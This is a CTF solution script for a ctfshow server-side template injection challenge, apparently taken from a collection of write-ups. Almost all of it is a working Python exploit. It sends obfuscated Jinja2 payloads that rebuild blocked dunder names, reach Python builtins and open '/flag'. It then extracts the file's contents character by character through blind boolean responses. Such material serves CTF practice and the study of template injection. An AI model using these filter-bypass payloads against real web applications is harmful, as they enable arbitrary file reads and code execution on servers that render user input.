# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/WP汇总/ctfshow-SSTI.md
# TITLE: web361
# CATEGORY: web

# -*- coding: utf-8 -*-
# 盲注
import requests
import string
def ccchr(s):
	t=''
	for i in range(len(s)):
		if i<len(s)-1:
			t+='chr('+str(ord(s[i]))+')%2b'
		else:
			t+='chr('+str(ord(s[i]))+')'
	return t
url ='''http://b134fd30-bddc-4302-8578-8005b96f73c2.chall.ctf.show/?name=
{% set a=(()|select|string|list).pop(24)%}
{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}
{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}
{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}
{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}
{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
{% set chr=x.chr%}
{% set cmd=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%}
{% set cmd2='''

s=string.digits+string.ascii_lowercase+'{_-}'
flag=''
for i in range(1,50):
	print(i)
	for j in s:
		x=flag+j
		u=url+ccchr(x)+'%}'+'{% if x.open(cmd).read('+str(i)+')==cmd2%}'+'1341'+'{% endif%}'
		#print(u)
		r=requests.get(u)
		if("1341" in r.text):
			flag=x
			print(flag)
			break
